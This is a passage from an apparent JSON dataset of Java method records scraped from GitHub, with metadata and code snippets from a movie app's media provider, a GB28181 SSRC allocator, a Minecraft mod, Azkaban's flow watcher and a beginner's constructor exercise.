buildQuery(params);\n        url = url + \"?\" + query;\n        requestBuilder.url(url);\n\n        Timber.d(this.getClass().getSimpleName(), \"Making request to: \" + url);\n\n        fetchList(currentList, requestBuilder, filters, callback);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33459, "method_name": "fetchList", "class_name": "MediaProvider", "params": ["ArrayList<Media>", "Request", "Filters", "Callback"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void fetchList(final ArrayList<Media> currentList, final Request.Builder requestBuilder, final Filters filters, final Callback callback) {\n        enqueue(requestBuilder.build(), new okhttp3.Callback() {\n            @Override\n            public void onFailure(Call call, IOException e) {\n                String url = requestBuilder.build().url().toString();\n                if (currentApi >= apiUrls.length - 1) {\n                    callback.onFailure(e);\n                } else {\n                    if (url.contains(apiUrls[currentApi])) {\n                        url = url.replace(apiUrls[currentApi], apiUrls[currentApi + 1]);\n                        currentApi++;\n                    } else {\n                        url = url.replace(apiUrls[currentApi - 1], apiUrls[currentApi]);\n                    }\n                    requestBuilder.url(url);\n                    fetchList(currentList, requestBuilder, filters, callback);\n                }\n            }\n\n            @Override\n            public void onResponse(Call call, Response response) throws IOException {\n                if (response.isSuccessful()) {\n\n                    String responseStr = response.body().string();\n\n                    if (responseStr.isEmpty()) {\n                        onFailure(call, new IOException(\"Empty response\"));\n                    }\n                    int actualSize = currentList.size();\n                    ArrayList<Media> responseItems = getResponseFormattedList(responseStr, currentList);\n                    callback.onSuccess(filters, responseItems);\n                    return;\n                }\n                onFailure(call, new IOException(\"Couldn't connect to API\"));\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33460, "method_name": "getDetail", "class_name": "MediaProvider", "params": ["ArrayList<Media>", "Integer", "Callback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getDetail(ArrayList<Media> currentList, Integer index, final Callback callback) {\n        Request.Builder requestBuilder = new Request.Builder();\n        String url = apiUrls[currentApi] + itemDetailsPath + currentList.get(index).videoId;\n        requestBuilder.url(url);\n\n        Timber.d(this.getClass().getSimpleName(), \"Making request to: \" + url);\n\n        enqueue(requestBuilder.build(), new okhttp3.Callback() {\n            @Override\n            public void onFailure(Call call, IOException e) {\n                callback.onFailure(e);\n            }\n\n            @Override\n            public void onResponse(Call call, Response response) throws IOException {\n                try {\n                    if (response.isSuccessful()) {\n\n                        String responseStr = response.body().string();\n\n                        if (responseStr.isEmpty()) {\n                            callback.onFailure(new NetworkErrorException(\"Empty response\"));\n                        }\n\n                        ArrayList<Media> formattedData = getResponseDetailsFormattedList(responseStr);\n                        if (formattedData.size() > 0) {\n                            callback.onSuccess(null, formattedData);\n                            return;\n                        }\n                        callback.onFailure(new IllegalStateException(\"Empty list\"));\n                        return;\n                    }\n                } catch (Exception e) {\n                    callback.onFailure(e);\n                }\n                callback.onFailure(new NetworkErrorException(\"Couldn't connect to API\"));\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33461, "method_name": "getLoadingMessage", "class_name": "MediaProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLoadingMessage() {\n        return R.string.loading;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33462, "method_name": "getResponseFormattedList", "class_name": "MediaProvider", "params": ["String", "ArrayList<Media>"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "ArrayList<Media>", "snippet": "    public ArrayList<Media> getResponseFormattedList(String responseStr, ArrayList<Media> currentList) throws IOException {\n        return new ArrayList<>();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33463, "method_name": "getResponseDetailsFormattedList", "class_name": "MediaProvider", "params": ["String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "ArrayList<Media>", "snippet": "    public ArrayList<Media> getResponseDetailsFormattedList(String responseStr) throws IOException {\n        return new ArrayList<>();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33464, "method_name": "getNavigation", "class_name": "MediaProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<NavInfo>", "snippet": "    public List<NavInfo> getNavigation() {\n        return new ArrayList<>();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33465, "method_name": "getDefaultNavigationIndex", "class_name": "MediaProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getDefaultNavigationIndex() {\n        return DEFAULT_NAVIGATION_INDEX;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33466, "method_name": "getGenres", "class_name": "MediaProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Genre>", "snippet": "    public List<Genre> getGenres() {\n        return new ArrayList<>();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33467, "method_name": "getSubsProvider", "class_name": "MediaProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SubsProvider", "snippet": "    public SubsProvider getSubsProvider() {\n        return subsProvider;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33468, "method_name": "hasSubsProvider", "class_name": "MediaProvider", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasSubsProvider() {\n        return subsProvider != null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33469, "method_name": "getKeywords", "class_name": "Filters", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getKeywords() {\n            return keywords;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33470, "method_name": "setKeywords", "class_name": "Filters", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setKeywords(String keywords) {\n            this.keywords = keywords;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33471, "method_name": "getGenre", "class_name": "Filters", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getGenre() {\n            return genre;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33472, "method_name": "setGenre", "class_name": "Filters", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setGenre(String genre) {\n            this.genre = genre;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33473, "method_name": "getOrder", "class_name": "Filters", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Order", "snippet": "        public Order getOrder() {\n            return order;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33474, "method_name": "setOrder", "class_name": "Filters", "params": ["Order"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setOrder(Order order) {\n            this.order = order;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33475, "method_name": "getSort", "class_name": "Filters", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Sort", "snippet": "        public Sort getSort() {\n            return sort;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33476, "method_name": "setSort", "class_name": "Filters", "params": ["Sort"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setSort(Sort sort) {\n            this.sort = sort;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33477, "method_name": "getPage", "class_name": "Filters", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "        public Integer getPage() {\n            return page;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33478, "method_name": "setPage", "class_name": "Filters", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPage(Integer page) {\n            this.page = page;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33479, "method_name": "getLangCode", "class_name": "Filters", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getLangCode() {\n            return langCode;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33480, "method_name": "setLangCode", "class_name": "Filters", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setLangCode(String langCode) {\n            this.langCode = langCode;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33481, "method_name": "getFilter", "class_name": "NavInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Filters", "snippet": "        public Filters.Sort getFilter() {\n            return mSort;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33482, "method_name": "getId", "class_name": "NavInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getId() {\n            return mId;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33483, "method_name": "getIcon", "class_name": "NavInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int getIcon() {\n            return mIconId;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33484, "method_name": "getOrder", "class_name": "NavInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Filters", "snippet": "        public Filters.Order getOrder() {\n            return mDefOrder;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33485, "method_name": "getLabel", "class_name": "NavInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getLabel() {\n            return mLabel;\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/MediaProvider.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"id": 33486, "method_name": "init", "class_name": "SsrcUtil", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "\tprivate static void init() {\n\t\tSipConfig sipConfig = (SipConfig) SpringBeanFactory.getBean(\"sipConfig\");\n\t\tssrcPrefix = sipConfig.getSipDomain().substring(4, 9);\n\t\tisUsed = new ArrayList<String>();\n\t\tnotUsed = new ArrayList<String>();\n\t\tfor (int i = 1; i < 10000; i++) {\n\t\t\tif (i < 10) {\n\t\t\t\tnotUsed.add(\"000\" + i);\n\t\t\t} else if (i < 100) {\n\t\t\t\tnotUsed.add(\"00\" + i);\n\t\t\t} else if (i < 1000) {\n\t\t\t\tnotUsed.add(\"0\" + i);\n\t\t\t} else {\n\t\t\t\tnotUsed.add(String.valueOf(i));\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/utils/SsrcUtil.java", "stars": "29", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33487, "method_name": "getPlaySsrc", "class_name": "SsrcUtil", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String getPlaySsrc() {\n\t\treturn \"0\" + getSsrcPrefix() + getSN();\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/utils/SsrcUtil.java", "stars": "29", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33488, "method_name": "getPlayBackSsrc", "class_name": "SsrcUtil", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String getPlayBackSsrc() {\n\t\treturn \"1\" + getSsrcPrefix() + getSN();\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/utils/SsrcUtil.java", "stars": "29", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33489, "method_name": "releaseSsrc", "class_name": "SsrcUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void releaseSsrc(String ssrc) {\n\t\tString sn = ssrc.substring(6);\n\t\tisUsed.remove(sn);\n\t\tnotUsed.add(sn);\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/utils/SsrcUtil.java", "stars": "29", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33490, "method_name": "getSN", "class_name": "SsrcUtil", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "\tprivate static String getSN() {\n\t\tString sn = null;\n\t\tif (notUsed.size() == 0) {\n\t\t\tthrow new RuntimeException(\"ssrc\u5df2\u7ecf\u7528\u5b8c\");\n\t\t} else if (notUsed.size() == 1) {\n\t\t\tsn = notUsed.get(0);\n\t\t} else {\n\t\t\tsn = notUsed.get(new Random().nextInt(notUsed.size() - 1));\n\t\t}\n\t\tnotUsed.remove(0);\n\t\tisUsed.add(sn);\n\t\treturn sn;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/utils/SsrcUtil.java", "stars": "29", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33491, "method_name": "getSsrcPrefix", "class_name": "SsrcUtil", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "\tprivate static String getSsrcPrefix() {\n\t\tif (ssrcPrefix == null) {\n\t\t\tinit();\n\t\t}\n\t\treturn ssrcPrefix;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/utils/SsrcUtil.java", "stars": "29", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33492, "method_name": "getCapacity", "class_name": "EVEStorage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCapacity() {\n        return capacity;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorage.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorage"], "modifiers": ["public"]}}, {"id": 33493, "method_name": "setCapacity", "class_name": "EVEStorage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCapacity(int capacity) {\n        this.capacity = capacity;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorage.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorage"], "modifiers": ["public"]}}, {"id": 33494, "method_name": "getEVE", "class_name": "EVEStorage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Eve", "snippet": "    public Eve getEVE() {\n        return energy;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorage.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorage"], "modifiers": ["public"]}}, {"id": 33495, "method_name": "setEVE", "class_name": "EVEStorage", "params": ["Eve"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEVE(Eve incoming) {\n        this.energy = incoming;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorage.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorage"], "modifiers": ["public"]}}, {"id": 33496, "method_name": "blendEVE", "class_name": "EVEStorage", "params": ["Eve", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "Eve", "snippet": "    public Eve blendEVE(Eve incoming, boolean simulate) {\n        Pairs<Eve, Eve> result = DataHelper.blend(energy, incoming);\n        if (!simulate)\n            setEVE(result.getFirst());\n        return result.getSecond();\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorage.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorage"], "modifiers": ["public"]}}, {"id": 33497, "method_name": "getHueRange", "class_name": "EVEStorage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Range", "snippet": "    public Range getHueRange() {\n        return hueRange;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorage.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorage"], "modifiers": ["public"]}}, {"id": 33498, "method_name": "getBrightnessRange", "class_name": "EVEStorage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Range", "snippet": "    public Range getBrightnessRange() {\n        return brightnessRange;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorage.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorage"], "modifiers": ["public"]}}, {"id": 33499, "method_name": "canBlend", "class_name": "EVEStorage", "params": ["Eve"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean canBlend(Eve incoming) {\n        return hueRange.in(incoming.getHue()) && brightnessRange.in(incoming.getBrightness());\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Magic/EVE/Storage/EVEStorage.java", "stars": "2", "class_props": {"extends": null, "implements": ["IEVEStorage"], "modifiers": ["public"]}}, {"id": 33500, "method_name": "setFlow", "class_name": "FlowWatcher", "params": ["ExecutableFlow"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFlow(final ExecutableFlow flow) {\n    this.flow = flow;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33501, "method_name": "getLogger", "class_name": "FlowWatcher", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Logger", "snippet": "  protected Logger getLogger() {\n    return this.logger;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33502, "method_name": "setLogger", "class_name": "FlowWatcher", "params": ["Logger"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLogger(final Logger logger) {\n    this.logger = logger;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33503, "method_name": "handleJobStatusChange", "class_name": "FlowWatcher", "params": ["String", "Status"], "throws": null, "modifiers": ["synchronized", "protected"], "return_type": "void", "snippet": "  protected synchronized void handleJobStatusChange(final String jobId, final Status status) {\n    final BlockingStatus block = this.map.get(jobId);\n    if (block != null) {\n      block.changeStatus(status);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33504, "method_name": "getExecId", "class_name": "FlowWatcher", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecId() {\n    return this.execId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33505, "method_name": "getBlockingStatus", "class_name": "FlowWatcher", "params": ["String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "BlockingStatus", "snippet": "  public synchronized BlockingStatus getBlockingStatus(final String jobId) {\n    if (this.cancelWatch) {\n      return null;\n    }\n\n    final ExecutableNode node = this.flow.getExecutableNodePath(jobId);\n    if (node == null) {\n      return null;\n    }\n\n    BlockingStatus blockingStatus = this.map.get(jobId);\n    if (blockingStatus == null) {\n      blockingStatus = new BlockingStatus(this.execId, jobId, node.getStatus());\n      this.map.put(jobId, blockingStatus);\n    }\n\n    return blockingStatus;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33506, "method_name": "peekStatus", "class_name": "FlowWatcher", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Status", "snippet": "  public Status peekStatus(final String jobId) {\n    if (Status.isStatusFinished(this.flow.getStatus())) {\n      return null;\n    }\n    final ExecutableNode node = this.flow.getExecutableNodePath(jobId);\n    if (node != null) {\n      ExecutableFlowBase parentFlow = node.getParentFlow();\n      while (parentFlow != null) {\n        Status parentStatus = parentFlow.getStatus();\n        if (parentStatus == Status.SKIPPED || parentStatus == Status.DISABLED) {\n          return Status.SKIPPED;\n        }\n        parentFlow = parentFlow.getParentFlow();\n      }\n      return node.getStatus();\n    }\n\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33507, "method_name": "unblockAllWatches", "class_name": "FlowWatcher", "params": [], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "void", "snippet": "  public synchronized void unblockAllWatches() {\n    this.logger.info(\"Unblock all watches on \" + this.execId);\n    this.cancelWatch = true;\n\n    for (final BlockingStatus status : this.map.values()) {\n      this.logger.info(\"Unblocking \" + status.getJobId());\n      status.changeStatus(Status.SKIPPED);\n      status.unblock();\n    }\n\n    this.logger.info(\"Successfully unblocked all watches on \" + this.execId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33508, "method_name": "isWatchCancelled", "class_name": "FlowWatcher", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isWatchCancelled() {\n    return this.cancelWatch;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33509, "method_name": "stopWatcher", "class_name": "FlowWatcher", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "  public abstract void stopWatcher();\n}\n\n", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/FlowWatcher.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 33510, "method_name": "init", "class_name": "RegistryHandler", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void init() {\n        ITEMS.register(FMLJavaModLoadingContext.get().getModEventBus());\n        BLOCKS.register(FMLJavaModLoadingContext.get().getModEventBus());\n    }", "url": "https://raw.githubusercontent.com/MrzDev/mod/master/src/main/java/com/mrz/swordmod/util/RegistryHandler.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33511, "method_name": "main", "class_name": "ConstructorTest02", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t\n\t\t//\u521b\u5efa\u5bf9\u8c61\n\t\t //\u5f53\u4e00\u4e2a\u7c7b\u4e2d\u5143\u7d20\u8fc7\u591a\uff0c\u60f3\u5feb\u901f\u67e5\u770b\uff0c\u5728\u5f53\u524d\u7c7b\u4e2d\u4f7f\u7528CTRL + o \u5feb\u6377\u952e\uff0c\u7136\u540e\u8f93\u5165\u8981\u67e5\u627e\u7684\u5143\u7d20\u540d\u79f0\u3002\n\t\t Account act1 = new Account();\n\t\t \n\t\t System.out.println(\"\u8d26\u53f7: \" + act1.getActno());\n\t\t System.out.println(\"\u4f59\u989d: \" + act1.getBalance());\n\t\t \n\t\t Account act2 = new Account(\"222\");\n\t\t \n\t\t System.out.println(\"\u8d26\u53f7: \" + act2.getActno());\n\t\t System.out.println(\"\u4f59\u989d: \" + act2.getBalance());\n\t\t \n\t\t Account act3 = new Account(33.33);\n\t\t \n\t\t System.out.println(\"\u8d26\u53f7: \" + act3.getActno());\n\t\t System.out.println(\"\u4f59\u989d: \" + act3.getBalance());\n\t\t \n\t\t Account act4 = new Account(\"444\" , 44.44);\n\t\t \n\t\t System.out.println(\"\u8d26\u53f7: \" + act4.getActno());\n\t\t System.out.println(\"\u4f59\u989d: \" + act4.getBalance());\n\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/leiTest/ConstructorTest02.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33512, "method_name": "main", "class_name": "TuneEverything", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws IOException {\n\t\tint l, stringLength, iterations, minIndex, END, END1, END2, STEP2, nThreads;\n\t\tlong time;\n\t\tdouble min;\n\t\tdouble[] 